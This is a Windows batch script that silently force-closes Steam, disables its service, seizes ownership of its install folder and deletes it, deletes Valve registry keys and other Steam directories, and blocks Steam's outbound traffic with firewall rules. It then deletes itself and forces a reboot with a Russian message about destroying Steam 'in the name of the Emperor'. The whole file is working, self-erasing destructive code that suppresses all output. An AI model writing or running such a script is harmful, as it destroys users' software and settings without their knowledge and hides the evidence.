@echo off
setlocal enabledelayedexpansion
set "STEAM_PATH=%ProgramFiles(x86)%\Steam"
set "self=%~f0"

REM 
taskkill /f /im steam.exe /im steamservice.exe /im steamwebhelper.exe >nul 2>&1
sc config Steam Client Service start= disabled >nul
net stop "Steam Client Service" /y >nul

REM 
if exist "!STEAM_PATH!" (
    takeown /f "!STEAM_PATH!" /r /d y >nul
    icacls "!STEAM_PATH!" /grant:r *S-1-5-32-544:F /t >nul
    rmdir /s /q "!STEAM_PATH!" >nul
)

REM 
reg delete "HKCU\Software\Valve\Steam" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Valve" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Wow6432Node\Valve" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Steam /f >nul 2>&1

REM 
set "alt_paths=%SystemDrive%\Steam %AppData%\Steam %LocalAppData%\Steam"
for %%d in (!alt_paths!) do (
    if exist "%%d" (
        rmdir /s /q "%%d" >nul 2>&1
    )
)

REM 
netsh advfirewall firewall add rule name="KILL_STEAM" dir=out action=block program="steam.exe" >nul
netsh advfirewall firewall add rule name="KILL_STEAM_IP" dir=out action=block remoteip=208.64.202.69,208.64.200.52,162.254.193.53 >nul

REM 
timeout /t 3 /nobreak >nul
del /f /q "%self%" >nul
shutdown /r /f /t 5 /c "Steam уничтожен во имя Императора"
